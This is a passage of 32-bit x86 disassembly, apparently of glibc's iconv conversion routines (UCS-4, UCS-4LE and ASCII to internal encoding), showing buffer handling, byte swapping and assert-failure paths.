test esi, esi
mov eax, dword [eax + 4]
mov dword [var_30h], eax
lea eax, [var_10h]
cmove eax, dword [var_34h]
test ebx, ebx
mov dword [var_34h], eax
je 0x8058408
mov edx, dword [arg_ch]
mov esi, dword [edx + 0x14]
mov ebx, dword [esi]
mov eax, ebx
mov dword [var_44h], ebx
and eax, 7
je 0x8058408
mov edx, dword [arg_18h]
test edx, edx
jne 0x80586b8
mov edi, dword [arg_14h]
mov edx, eax
cmp dword [var_2ch], edi
jae 0x8058699
cmp eax, 3
ja 0x80583b4
mov edi, dword [arg_10h]
lea eax, [ecx + 1]
mov dword [edi], eax
movzx eax, byte [ecx]
mov byte [esi + edx + 4], al
mov ecx, dword [edi]
inc edx
cmp ecx, dword [arg_14h]
jae 0x8058699
cmp edx, 3
jbe 0x8058394
cmp byte [esi + 4], 0x80
ja 0x8058677
movzx eax, byte [esi + 7]
mov edx, dword [var_14h]
mov byte [edx], al
movzx eax, byte [esi + 6]
mov edx, dword [var_14h]
mov byte [edx + 1], al
movzx eax, byte [esi + 5]
mov edx, dword [var_14h]
mov byte [edx + 2], al
movzx eax, byte [esi + 4]
mov edx, dword [var_14h]
mov byte [edx + 3], al
mov ebx, dword [esi]
add dword [var_14h], 4
and ebx, 0xfffffff8
xor eax, eax
mov dword [esi], ebx
test eax, eax
jne 0x8058551
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, dword [eax + 8]
mov ecx, dword [edx]
mov dword [var_40h], eax
mov edi, dword [var_14h]
mov eax, dword [arg_14h]
mov dword [var_2ch], ecx
mov edx, dword [var_30h]
sub eax, ecx
mov ebx, edi
sub edx, edi
cmp edx, eax
cmovg edx, eax
cmp edx, 0xffffffff
lea eax, [edx + 3]
mov esi, edx
cmovle esi, eax
xor edx, edx
sar esi, 2
cmp edx, esi
jae 0x8058462
mov eax, dword [var_40h]
and eax, 2
mov dword [var_3ch], eax
lea esi, [esi]
mov eax, dword [ecx]
ror ax, 8
ror eax, 0x10
ror ax, 8
test eax, eax
js 0x8058640
mov dword [ebx], eax
add ebx, 4
inc edx
add ecx, 4
cmp edx, esi
jb 0x8058440
mov eax, dword [arg_10h]
mov dword [eax], ecx
cmp ecx, dword [arg_14h]
mov eax, 4
mov dword [var_14h], ebx
je 0x8058484
lea eax, [ebx + 4]
cmp eax, dword [var_30h]
setbe al
movzx eax, al
lea eax, [eax + eax + 5]
mov dword [var_38h], eax
mov esi, dword [var_38h]
mov eax, dword [arg_18h]
test eax, eax
jne 0x8058633
mov edx, dword [arg_ch]
mov ebx, dword [edx + 0x20]
test ebx, ebx
je 0x80584b2
nop
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8058602
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x80584a0
mov edx, dword [arg_ch]
inc dword [edx + 0xc]
test byte [edx + 8], 1
jne 0x80585ed
cmp dword [var_14h], edi
jbe 0x805852c
mov eax, dword [edx]
mov ecx, dword [var_24h]
mov dword [var_18h], eax
mov dword [esp], ecx
call fcn.08083520
mov eax, dword [arg_1ch]
mov edi, dword [arg_24h]
mov dword [var_sp_18h], 0
mov edx, dword [var_20h]
mov ecx, dword [var_1ch]
mov dword [var_sp_10h], 0
mov dword [var_sp_14h], eax
mov dword [var_sp_1ch], edi
mov eax, dword [var_14h]
mov dword [var_4h], edx
mov dword [esp], ecx
mov dword [var_ch], eax
lea eax, [var_18h]
mov dword [var_8h], eax
call dword [var_24h]
cmp eax, 4
je 0x80585d4
mov ecx, dword [var_18h]
mov edx, dword [var_14h]
cmp ecx, edx
jne 0x80585c8
mov esi, eax
test esi, esi
jne 0x8058548
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
mov edi, dword [ecx + 8]
mov dword [var_14h], eax
mov dword [var_40h], edi
mov eax, dword [arg_10h]
mov ecx, dword [eax]
jmp 0x8058408
mov eax, dword [arg_24h]
test eax, eax
jne 0x8058559
mov eax, esi
add esp, 0x58
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x805854f
mov edx, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [edx]
sub eax, ecx
cmp eax, 3
jg 0x80585a4
xor ebx, ebx
cmp ecx, dword [arg_14h]
jae 0x8058593
mov edi, dword [arg_ch]
lea eax, [ecx + 1]
mov edx, dword [edi + 0x14]
mov edi, dword [arg_10h]
mov dword [edi], eax
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov eax, dword [edi]
inc ebx
cmp eax, dword [arg_14h]
mov ecx, eax
jb 0x8058574
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ebx
mov dword [edx], eax
jmp 0x805854f
mov dword [var_ch], str.__gconv_transform_ucs4_internal
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov edi, dword [arg_10h]
sub edx, ecx
sub dword [edi], edx
jmp 0x805852a
cmp dword [var_38h], 5
jne 0x805852c
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x805852c
mov eax, dword [var_14h]
mov ecx, dword [arg_ch]
mov edi, dword [arg_1ch]
mov dword [ecx], eax
mov eax, dword [var_10h]
add dword [edi], eax
jmp 0x8058548
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov ecx, dword [arg_10h]
mov dword [var_ch], edi
mov dword [var_sp_10h], eax
mov eax, dword [ecx]
mov dword [var_8h], eax
mov eax, dword [var_2ch]
mov dword [var_4h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x80584ab
mov eax, dword [var_14h]
mov ecx, dword [arg_18h]
mov dword [ecx], eax
jmp 0x805854f
mov eax, dword [var_34h]
mov dword [var_38h], 6
test eax, eax
je 0x8058487
mov eax, dword [var_3ch]
test eax, eax
je 0x8058663
mov eax, dword [var_34h]
inc dword [eax]
jmp 0x805845a
mov edx, dword [arg_10h]
mov dword [var_38h], 6
mov dword [edx], ecx
mov dword [var_14h], ebx
jmp 0x8058487
test byte [var_28h], 2
jne 0x80583eb
and dword [var_44h], 7
mov eax, 6
sub edx, dword [var_44h]
sub ecx, edx
mov edx, dword [arg_10h]
mov dword [edx], ecx
jmp 0x80583f2
cmp edx, 3
ja 0x80583b4
and dword [var_44h], 0xfffffff8
or dword [var_44h], edx
mov eax, dword [var_44h]
mov dword [esi], eax
mov eax, 7
jmp 0x80583f2
mov dword [var_ch], str.__gconv_transform_ucs4_internal
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x80585c3
mov edi, dword [arg_18h]
mov eax, dword [edi]
jmp 0x805832c
mov eax, dword [arg_18h]
test eax, eax
jne 0x8058758
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x805854f
mov ecx, dword [var_24h]
mov dword [esp], ecx
call fcn.08083520
mov edi, dword [arg_24h]
mov eax, dword [arg_1ch]
mov dword [var_sp_18h], ebx
mov edx, dword [var_20h]
mov ecx, dword [var_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_1ch], edi
mov dword [var_sp_14h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call dword [var_24h]
mov esi, eax
jmp 0x805854f
mov dword [var_ch], str.__gconv_transform_ucs4_internal
mov dword [var_8h], 0x19f
jmp 0x80586c8
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x40
mov ecx, dword [arg_ch]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_1ch], edx
test byte [ecx + 8], 1
mov dword [var_18h], eax
jne 0x8058b5a
mov esi, dword [eax + 0x14]
mov dword [var_20h], esi
test ebx, ebx
jne 0x8058acd
mov eax, dword [arg_10h]
mov esi, dword [arg_18h]
mov ecx, dword [eax]
test esi, esi
mov edi, ecx
jne 0x8058ac3
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_10h], eax
mov ebx, dword [arg_24h]
mov eax, dword [arg_ch]
mov eax, dword [eax + 4]
test ebx, ebx
mov dword [var_28h], eax
je 0x8058865
mov edx, dword [arg_ch]
mov ebx, dword [edx + 0x14]
mov esi, dword [ebx]
mov eax, esi
and eax, 7
je 0x8058865
mov edx, dword [arg_18h]
test edx, edx
jne 0x8058a9f
cmp edi, dword [arg_14h]
mov edx, eax
jae 0x8058a85
cmp eax, 3
ja 0x8058821
mov edi, dword [arg_10h]
lea eax, [ecx + 1]
mov dword [edi], eax
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov ecx, dword [edi]
inc edx
cmp ecx, dword [arg_14h]
jae 0x8058a85
cmp edx, 3
jbe 0x8058801
movzx eax, byte [ebx + 4]
mov edx, dword [var_10h]
mov byte [edx], al
movzx eax, byte [ebx + 5]
mov edx, dword [var_10h]
mov byte [edx + 1], al
movzx eax, byte [ebx + 6]
mov edx, dword [var_10h]
mov byte [edx + 2], al
movzx eax, byte [ebx + 7]
mov edx, dword [var_10h]
mov byte [edx + 3], al
xor eax, eax
and dword [ebx], 0xfffffff8
add dword [var_10h], 4
mov dword [var_24h], eax
test eax, eax
jne 0x805898a
lea esi, [esi]
mov esi, dword [arg_10h]
mov ecx, dword [esi]
mov esi, dword [var_10h]
mov edx, dword [arg_14h]
mov edi, ecx
mov eax, dword [var_28h]
sub edx, ecx
sub eax, esi
cmp eax, edx
cmovg eax, edx
cmp eax, 0xffffffff
lea edx, [eax + 3]
cmovg edx, eax
and edx, 0xfffffffc
lea eax, [edx + ecx]
mov ecx, dword [arg_10h]
mov dword [ecx], eax
mov dword [esp], esi
mov dword [var_4h], edi
mov dword [var_8h], edx
call fcn.08053740
mov edx, dword [arg_10h]
mov dword [var_10h], eax
mov ecx, dword [arg_14h]
cmp dword [edx], ecx
je 0x8058a79
add eax, 4
cmp eax, dword [var_28h]
setbe al
movzx eax, al
lea eax, [eax + eax + 5]
mov dword [var_2ch], eax
mov eax, dword [arg_18h]
mov edx, dword [var_2ch]
test eax, eax
mov dword [var_24h], edx
jne 0x8058a6e
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 0x20]
test ebx, ebx
je 0x80588f2
lea esi, [esi]
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8058a40
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x80588e0
mov ecx, dword [arg_ch]
inc dword [ecx + 0xc]
test byte [ecx + 8], 1
jne 0x8058a2c
cmp dword [var_10h], esi
jbe 0x805896c
mov eax, dword [ecx]
mov esi, dword [var_20h]
mov dword [var_14h], eax
mov dword [esp], esi
call fcn.08083520
mov eax, dword [arg_1ch]
mov edi, dword [arg_24h]
mov dword [var_sp_18h], 0
mov edx, dword [var_1ch]
mov ecx, dword [var_18h]
mov dword [var_sp_10h], 0
mov dword [var_sp_14h], eax
mov dword [var_sp_1ch], edi
mov eax, dword [var_10h]
mov dword [var_4h], edx
mov dword [esp], ecx
mov dword [var_ch], eax
lea eax, [var_14h]
mov dword [var_8h], eax
call esi
cmp eax, 4
je 0x8058a0e
mov ecx, dword [var_14h]
mov edx, dword [var_10h]
cmp ecx, edx
jne 0x8058a02
mov dword [var_24h], eax
mov eax, dword [var_24h]
test eax, eax
jne 0x8058980
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_10h], eax
jmp 0x8058860
mov eax, dword [arg_24h]
test eax, eax
jne 0x8058992
mov eax, dword [var_24h]
add esp, 0x40
pop ebx
pop esi
pop edi
leave
ret
cmp dword [var_24h], 7
jne 0x8058987
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [edi]
sub eax, ecx
cmp eax, 3
jg 0x80589de
xor ebx, ebx
cmp ecx, dword [arg_14h]
jae 0x80589cd
mov edi, dword [arg_10h]
mov esi, dword [arg_ch]
lea eax, [ecx + 1]
mov dword [edi], eax
mov edx, dword [esi + 0x14]
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov eax, dword [edi]
inc ebx
cmp eax, dword [arg_14h]
mov ecx, eax
jb 0x80589ae
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ebx
mov dword [edx], eax
jmp 0x8058987
mov dword [var_ch], str.__gconv_transform_internal_ucs4le
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov esi, dword [arg_10h]
sub edx, ecx
sub dword [esi], edx
jmp 0x8058969
cmp dword [var_2ch], 5
jne 0x805896c
mov edi, dword [arg_ch]
mov dword [var_24h], 0
mov eax, dword [edi]
mov dword [var_10h], eax
jmp 0x805896c
mov eax, dword [var_10h]
mov edx, dword [arg_ch]
mov dword [edx], eax
jmp 0x8058980
lea esi, [esi]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_10h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_sp_10h], eax
mov eax, dword [edx]
mov dword [var_4h], edi
mov dword [var_8h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x80588eb
mov eax, dword [var_10h]
mov edx, dword [arg_18h]
jmp 0x80589da
mov dword [var_2ch], 4
jmp 0x80588c1
cmp edx, 3
ja 0x8058821
and esi, 0xfffffff8
mov eax, 7
or esi, edx
mov dword [ebx], esi
jmp 0x8058851
mov dword [var_ch], str.__gconv_transform_internal_ucs4le
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x80589fd
mov esi, dword [arg_18h]
mov eax, dword [esi]
jmp 0x80587c0
mov edi, dword [arg_18h]
test edi, edi
jne 0x8058b45
mov edi, dword [arg_ch]
mov dword [var_24h], 0
mov eax, dword [edi + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edi + 8], 1
jne 0x8058987
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_24h]
mov ecx, dword [arg_1ch]
mov dword [var_sp_18h], ebx
mov esi, dword [var_1ch]
mov edi, dword [var_18h]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_1ch], edx
mov dword [var_sp_14h], ecx
mov dword [var_4h], esi
mov dword [esp], edi
call dword [var_20h]
mov dword [var_24h], eax
jmp 0x8058987
mov dword [var_ch], str.__gconv_transform_internal_ucs4le
mov dword [var_8h], 0x19f
jmp 0x8058aaf
mov dword [var_20h], 0
jmp 0x80587a1
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x58
mov dword [var_24h], 0
mov ecx, dword [arg_ch]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_20h]
mov ecx, dword [ecx + 8]
add eax, 0x3c
add edx, 0x24
mov dword [var_1ch], eax
mov dword [var_20h], edx
mov dword [var_40h], ecx
mov dword [var_28h], ecx
and ecx, 1
jne 0x8058bac
mov edi, dword [eax + 0x14]
mov dword [var_24h], edi
test ebx, ebx
jne 0x8058f88
mov edi, dword [arg_10h]
mov ecx, dword [edi]
mov edi, dword [arg_18h]
test edi, edi
mov dword [var_2ch], ecx
jne 0x8058f7e
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_14h], eax
mov esi, dword [arg_1ch]
mov dword [var_34h], 0
mov eax, dword [arg_ch]
mov ebx, dword [arg_24h]
mov dword [var_10h], 0
test esi, esi
mov eax, dword [eax + 4]
mov dword [var_30h], eax
lea eax, [var_10h]
cmove eax, dword [var_34h]
test ebx, ebx
mov dword [var_34h], eax
je 0x8058ca8
mov edx, dword [arg_ch]
mov esi, dword [edx + 0x14]
mov ebx, dword [esi]
mov eax, ebx
mov dword [var_44h], ebx
and eax, 7
je 0x8058ca8
mov edx, dword [arg_18h]
test edx, edx
jne 0x8058f5a
mov edi, dword [arg_14h]
mov edx, eax
cmp dword [var_2ch], edi
jae 0x8058f3b
cmp eax, 3
ja 0x8058c54
mov edi, dword [arg_10h]
lea eax, [ecx + 1]
mov dword [edi], eax
movzx eax, byte [ecx]
mov byte [esi + edx + 4], al
mov ecx, dword [edi]
inc edx
cmp ecx, dword [arg_14h]
jae 0x8058f3b
cmp edx, 3
jbe 0x8058c34
cmp byte [esi + 7], 0x80
ja 0x8058f27
movzx eax, byte [esi + 4]
mov edx, dword [var_14h]
mov byte [edx], al
movzx eax, byte [esi + 5]
mov edx, dword [var_14h]
mov byte [edx + 1], al
movzx eax, byte [esi + 6]
mov edx, dword [var_14h]
mov byte [edx + 2], al
movzx eax, byte [esi + 7]
mov edx, dword [var_14h]
mov byte [edx + 3], al
mov ebx, dword [esi]
add dword [var_14h], 4
and ebx, 0xfffffff8
xor eax, eax
mov dword [esi], ebx
test eax, eax
jne 0x8058ded
mov edi, dword [arg_ch]
mov edi, dword [edi + 8]
mov eax, dword [arg_10h]
mov dword [var_40h], edi
mov ecx, dword [eax]
mov edi, dword [var_14h]
mov eax, dword [arg_14h]
mov dword [var_2ch], ecx
mov edx, dword [var_30h]
sub eax, ecx
mov ebx, edi
sub edx, edi
cmp edx, eax
cmovg edx, eax
cmp edx, 0xffffffff
lea eax, [edx + 3]
mov esi, edx
cmovle esi, eax
xor edx, edx
sar esi, 2
cmp edx, esi
jae 0x8058cf7
mov eax, dword [var_40h]
and eax, 2
mov dword [var_3ch], eax
lea esi, [esi]
mov eax, dword [ecx]
test eax, eax
js 0x8058f00
mov dword [ebx], eax
add ebx, 4
inc edx
add ecx, 4
cmp edx, esi
jb 0x8058ce0
mov edx, dword [arg_10h]
mov dword [edx], ecx
cmp ecx, dword [arg_14h]
mov dword [var_14h], ebx
mov eax, dword [edx]
mov edx, 4
je 0x8058d29
add eax, 4
mov edx, 7
cmp eax, dword [arg_14h]
ja 0x8058d29
lea eax, [ebx + 4]
mov edx, 5
cmp eax, dword [var_30h]
jbe 0x8058edc
mov dword [var_38h], edx
mov esi, dword [var_38h]
mov eax, dword [arg_18h]
test eax, eax
jne 0x8058ecf
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 0x20]
test ebx, ebx
je 0x8058d56
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8058e9e
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8058d44
mov eax, dword [arg_ch]
inc dword [eax + 0xc]
test byte [eax + 8], 1
jne 0x8058e89
cmp dword [var_14h], edi
jbe 0x8058dd0
mov eax, dword [eax]
mov ecx, dword [var_24h]
mov dword [var_18h], eax
mov dword [esp], ecx
call fcn.08083520
mov eax, dword [arg_1ch]
mov edi, dword [arg_24h]
mov dword [var_sp_18h], 0
mov edx, dword [var_20h]
mov ecx, dword [var_1ch]
mov dword [var_sp_10h], 0
mov dword [var_sp_14h], eax
mov dword [var_sp_1ch], edi
mov eax, dword [var_14h]
mov dword [var_4h], edx
mov dword [esp], ecx
mov dword [var_ch], eax
lea eax, [var_18h]
mov dword [var_8h], eax
call dword [var_24h]
cmp eax, 4
je 0x8058e70
mov ecx, dword [var_18h]
mov edx, dword [var_14h]
cmp ecx, edx
jne 0x8058e64
mov esi, eax
test esi, esi
jne 0x8058de4
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
mov edi, dword [ecx + 8]
mov dword [var_14h], eax
jmp 0x8058ca0
mov eax, dword [arg_24h]
test eax, eax
jne 0x8058df5
mov eax, esi
add esp, 0x58
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x8058deb
mov edx, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [edx]
sub eax, ecx
cmp eax, 3
jg 0x8058e40
xor ebx, ebx
cmp ecx, dword [arg_14h]
jae 0x8058e2f
mov edi, dword [arg_ch]
lea eax, [ecx + 1]
mov edx, dword [edi + 0x14]
mov edi, dword [arg_10h]
mov dword [edi], eax
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov eax, dword [edi]
inc ebx
cmp eax, dword [arg_14h]
mov ecx, eax
jb 0x8058e10
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ebx
mov dword [edx], eax
jmp 0x8058deb
mov dword [var_ch], str.__gconv_transform_ucs4le_internal
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov edi, dword [arg_10h]
sub edx, ecx
sub dword [edi], edx
jmp 0x8058dce
cmp dword [var_38h], 5
jne 0x8058dd0
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x8058dd0
mov eax, dword [var_14h]
mov edx, dword [arg_ch]
mov ecx, dword [arg_1ch]
mov dword [edx], eax
mov eax, dword [var_10h]
add dword [ecx], eax
jmp 0x8058de4
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov edx, dword [arg_10h]
mov dword [var_ch], edi
mov ecx, dword [var_2ch]
mov dword [var_sp_10h], eax
mov eax, dword [edx]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x8058d4f
mov eax, dword [var_14h]
mov ecx, dword [arg_18h]
mov dword [ecx], eax
jmp 0x8058deb
mov dword [var_ch], str.ucs4le_internal_loop
mov dword [var_8h], 0x28f
mov dword [var_4h], str.gconv_simple.c
mov dword [esp], str.outptrp__4___outend
jmp 0x8058e5f
mov eax, dword [var_34h]
mov dword [var_38h], 6
test eax, eax
je 0x8058d2c
mov eax, dword [var_3ch]
test eax, eax
je 0x8058d2c
mov eax, dword [var_34h]
inc dword [eax]
jmp 0x8058cef
test byte [var_28h], 2
mov eax, 6
je 0x8058c92
jmp 0x8058c8b
cmp edx, 3
ja 0x8058c54
and dword [var_44h], 0xfffffff8
or dword [var_44h], edx
mov eax, dword [var_44h]
mov dword [esi], eax
mov eax, 7
jmp 0x8058c92
mov dword [var_ch], str.__gconv_transform_ucs4le_internal
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x8058e5f
mov edi, dword [arg_18h]
mov eax, dword [edi]
jmp 0x8058bcc
mov eax, dword [arg_18h]
test eax, eax
jne 0x8058ffa
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x8058deb
mov ecx, dword [var_24h]
mov dword [esp], ecx
call fcn.08083520
mov edi, dword [arg_24h]
mov eax, dword [arg_1ch]
mov dword [var_sp_18h], ebx
mov edx, dword [var_20h]
mov ecx, dword [var_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_1ch], edi
mov dword [var_sp_14h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call dword [var_24h]
mov esi, eax
jmp 0x8058deb
mov dword [var_ch], str.__gconv_transform_ucs4le_internal
mov dword [var_8h], 0x19f
jmp 0x8058f6a
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov dword [var_24h], 0
mov ecx, dword [arg_ch]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_20h]
add eax, 0x3c
add edx, 0x24
mov dword [var_1ch], eax
mov dword [var_20h], edx
mov eax, dword [ecx + 8]
test al, 1
jne 0x8059048
mov edx, dword [var_1ch_3]
mov edx, dword [edx + 0x14]
mov dword [var_24h_3], edx
test ebx, ebx
jne 0x8059260
mov ecx, dword [var_ch]
mov edi, dword [ecx]
mov ecx, dword [var_18h]
test ecx, ecx
jne 0x8059258
mov ecx, dword [var_8h]
mov edx, dword [ecx]
mov dword [var_10h], 0
lea ecx, [var_10h]
mov dword [var_30h], ecx
mov dword [var_14h_2], edx
mov edx, dword [var_8h]
mov edx, dword [edx + 4]
mov dword [var_2ch], edx
mov edx, dword [var_1ch_2]
test edx, edx
je 0x805924c
lea esi, [esi]
cmp edi, dword [var_14h]
mov esi, dword [var_14h_2]
mov dword [var_34h], 4
mov edx, edi
mov ebx, esi
je 0x80590d4
and eax, 2
mov dword [var_38h], eax
lea esi, [esi]
lea ecx, [ebx + 4]
cmp ecx, dword [var_2ch]
ja 0x8059240
movzx eax, byte [edx]
test al, al
js 0x8059218
movzx eax, al
inc edx
mov dword [ebx], eax
mov ebx, ecx
cmp edx, dword [var_14h]
jne 0x80590b0
mov ecx, dword [var_ch]
mov eax, dword [var_34h]
mov dword [ecx], edx
mov dword [var_28h], eax
mov dword [var_14h_2], ebx
mov eax, dword [var_18h]
test eax, eax
jne 0x8059211
mov ecx, dword [var_8h]
mov ebx, dword [ecx + 0x20]
test ebx, ebx
je 0x8059109
mov eax, dword [ebx + 4]
test eax, eax
jne 0x80591e3
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x80590f7
mov ecx, dword [var_8h]
inc dword [ecx + 0xc]
test byte [ecx + 8], 1
jne 0x80591d1
cmp dword [var_14h_2], esi
jbe 0x805917e
mov eax, dword [ecx]
mov dword [var_18h_2], eax
mov eax, dword [var_24h_3]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h_2]
mov edx, dword [var_24h_2]
mov dword [var_1ch_2], 0
mov ecx, dword [var_1ch_2]
mov dword [var_14h], 0
mov dword [var_ch], eax
mov dword [var_20h_2], edx
lea eax, [var_18h_2]
mov dword [var_8h], eax
mov edx, dword [var_1ch_3]
mov dword [var_18h], ecx
mov eax, dword [var_20h_3]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_24h_3]
cmp eax, 4
mov ecx, eax
je 0x80591ba
mov edx, dword [var_18h_2]
mov eax, dword [var_14h_2]
cmp edx, eax
jne 0x80591a5
mov dword [var_28h], ecx
mov eax, dword [var_28h]
test eax, eax
jne 0x805919a
mov edx, dword [var_8h]
mov ecx, dword [var_ch]
mov eax, dword [edx]
mov dword [var_14h_2], eax
mov edi, dword [ecx]
mov eax, dword [edx + 8]
jmp 0x8059090
mov eax, dword [var_28h]
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret
sub eax, edx
cmp eax, 0xffffffff
lea edx, [eax + 3]
cmovle eax, edx
mov edx, dword [var_ch]
sar eax, 2
sub dword [edx], eax
jmp 0x805917b
cmp dword [var_34h], 5
jne 0x805917e
mov ecx, dword [var_8h]
mov dword [var_28h], 0
mov eax, dword [ecx]
mov dword [var_14h_2], eax
jmp 0x805917e
mov eax, dword [var_14h_2]
mov edx, dword [var_8h]
mov ecx, dword [var_1ch_2]
mov dword [edx], eax
mov eax, dword [var_10h]
add dword [ecx], eax
jmp 0x805919a
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h_2]
mov edx, dword [var_ch]
mov dword [var_ch], esi
mov dword [var_14h], eax
mov eax, dword [edx]
mov dword [var_4h], edi
mov dword [var_8h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x8059102
mov edx, dword [var_18h]
mov dword [edx], ebx
jmp 0x805919a
mov eax, dword [var_30h]
mov dword [var_34h], 6
test eax, eax
je 0x80590d4
mov eax, dword [var_38h]
test eax, eax
je 0x80590d4
mov eax, dword [var_30h]
inc edx
inc dword [eax]
jmp 0x80590cf
mov dword [var_34h], 5
jmp 0x80590d4
mov dword [var_30h], 0
jmp 0x8059090
mov ecx, dword [var_18h]
jmp 0x8059063
mov esi, dword [arg_18h]
test esi, esi
jne 0x80592d8
mov ecx, dword [var_8h]
mov dword [var_28h], 0
mov eax, dword [ecx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [ecx + 8], 1
jne 0x805919a
mov eax, dword [var_24h_3]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_24h_2]
mov ecx, dword [var_1ch_2]
mov dword [var_1ch_2], ebx
mov eax, dword [var_20h_3]
mov dword [var_14h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_20h_2], edx
mov dword [var_18h], ecx
mov edx, dword [var_1ch_3]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [var_24h_3]
mov dword [var_28h], eax
jmp 0x805919a
mov dword [var_ch], str.__gconv_transform_ascii_internal
mov dword [var_8h], 0x19f
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x6c
mov dword [var_38h], 0
mov edx, dword [var_8h]
mov eax, dword [var_4h]
mov ebx, dword [var_20h_2]
add edx, 0x24
add eax, 0x3c
mov dword [var_34h], edx
mov dword [var_30h], eax
mov eax, dword [var_8h]
mov eax, dword [eax + 8]
test al, 1
mov dword [var_58h], eax
mov dword [var_40h], eax
jne 0x805933e
mov edx, dword [var_30h]
mov edx, dword [edx + 0x14]
mov dword [var_38h], edx
test ebx, ebx
jne 0x805992a
mov ebx, dword [var_ch]
mov eax, dword [var_18h]
mov esi, dword [ebx]
test eax, eax
mov ecx, esi
jne 0x8059920
mov eax, dword [var_8h]
mov edx, dword [eax]
mov eax, dword [var_8h]
mov dword [var_48h], 0
mov edi, dword [var_24h_2]
mov dword [var_14h_2], edx
mov dword [var_10h], 0
mov eax, dword [eax + 4]
mov dword [var_44h], eax
mov eax, dword [var_1ch_2]
test eax, eax
